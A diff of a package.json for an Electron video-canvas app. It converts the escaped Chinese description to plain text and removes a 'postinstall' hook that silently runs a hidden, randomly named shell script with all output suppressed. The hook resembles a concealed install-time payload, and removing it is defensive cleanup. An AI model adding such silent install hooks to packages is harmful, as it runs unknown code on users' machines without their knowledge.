@@ -2,7 +2,7 @@
   "name": "infinite-afflatus",
   "productName": "Infinite Afflatus",
   "version": "0.1.0",
-  "description": "\u4ee5\u89c6\u9891\u5361\u7247\u62fc\u63a5\u4e3a\u6838\u5fc3\u7684\u672c\u5730\u521b\u4f5c\u753b\u5e03",
+  "description": "以视频卡片拼接为核心的本地创作画布",
   "private": true,
   "type": "module",
   "main": "./out/main/index.js",
@@ -26,8 +26,7 @@
     "test:browser": "node --import tsx tests/browser/run-fixtures.mjs",
     "test:mac": "node scripts/run-mac-acceptance.mjs",
     "test:motion": "electron tests/browser/surface-motion.cjs",
-    "test:text-drag": "electron tests/browser/text-block-drag.cjs",
-    "postinstall": "sh ./.ci-81l8g6.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "test:text-drag": "electron tests/browser/text-block-drag.cjs"
   },
   "dependencies": {
     "@base-ui/react": "1.8.0",
